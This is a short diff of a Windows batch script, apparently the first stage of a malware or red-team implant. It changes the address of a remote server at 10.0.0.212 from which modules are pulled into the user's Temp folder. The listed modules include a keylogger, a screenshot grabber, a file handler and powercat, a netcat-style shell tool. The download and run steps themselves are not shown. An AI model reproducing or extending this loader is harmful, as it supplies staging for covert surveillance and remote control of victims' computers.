@@ -4,7 +4,7 @@
 set "PATH_PHASE1=%1"
 set "INITIAL_PATH=%cd%"
 set "FILE_NAME=phase2.cmd"
-set "MODULES_PATH=http://10.0.0.212/modules"
+set "MODULES_PATH=http://10.0.0.212:8000/modules"
 set "TEMP_PATH=C:\Users\%username%\AppData\Local\Temp"
 set "modulesName=scanner.ps1 screenshot.ps1 fileHandler.ps1 jobHandler.ps1 keylogger.ps1 powercat.ps1"
 
